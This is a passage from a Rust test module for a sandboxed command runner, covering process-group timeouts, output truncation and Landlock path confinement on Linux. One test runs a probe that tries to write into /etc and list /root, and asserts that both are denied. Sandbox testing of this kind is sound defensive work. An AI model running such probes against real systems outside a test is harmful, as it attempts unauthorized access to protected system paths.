        assert!(!marker.exists(), "refused command must never spawn");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn timeout_kills_process_group() {
        let dir = tmp_dir("timeout");
        let out = run("sleep 30", &dir, Duration::from_millis(300)).unwrap();
        assert_eq!(out.exit_code, 124);
        assert!(out.stderr.contains("timed out"));
        // The group kill must land well before the 30s sleep completes.
        assert!(out.duration_ms < 5000.0, "duration was {}", out.duration_ms);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn output_cap_truncates() {
        let dir = tmp_dir("cap");
        // 300KB of 'a' exceeds the 256KB capture cap.
        let out = run(
            "head -c 300000 /dev/zero | tr '\\0' 'a'",
            &dir,
            Duration::from_secs(10),
        )
        .unwrap();
        assert_eq!(out.exit_code, 0);
        assert!(out.truncated);
        assert_eq!(out.stdout.len(), MAX_CAPTURE_BYTES);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn landlock_confinement_blocks_unauthorized_paths() {
        let dir = tmp_dir("landlock");
        // Within workspace: writing succeeds
        let out_ok = run("echo hello > ok.txt", &dir, Duration::from_secs(10)).unwrap();
        assert_eq!(out_ok.exit_code, 0);
        assert!(dir.join("ok.txt").exists());

        // Denied paths: writing to /etc or reading /root fails with permission denied
        let out_denied = run(
            "touch /etc/test_landlock_fail 2>&1 || ls /root 2>&1",
            &dir,
            Duration::from_secs(10),
        )
        .unwrap();
        let combined = format!("{} {}", out_denied.stdout, out_denied.stderr);
        assert!(
            combined.contains("Permission denied") || combined.contains("denied"),
            "Landlock must deny unauthorized paths: {combined}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn landlock_allows_dev_null_writes_and_toolchains() {
        let dir = tmp_dir("landlock_devnull");
        // Writing to /dev/null must succeed under Landlock (required by git, redirection, etc.)
        let out_devnull = run("echo test > /dev/null 2>&1", &dir, Duration::from_secs(10)).unwrap();
        assert_eq!(
            out_devnull.exit_code, 0,
            "Writing to /dev/null must succeed: {out_devnull:?}"
        );

        // If cargo is installed in ~/.cargo/bin, it must be executable under Landlock
        if std::env::var_os("HOME")
            .map(|h| PathBuf::from(h).join(".cargo/bin/cargo").exists())
            .unwrap_or(false)
        {
            let out_cargo = run("cargo --version", &dir, Duration::from_secs(10)).unwrap();
            assert_eq!(
                out_cargo.exit_code, 0,
                "cargo --version must succeed under Landlock: {out_cargo:?}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }
}
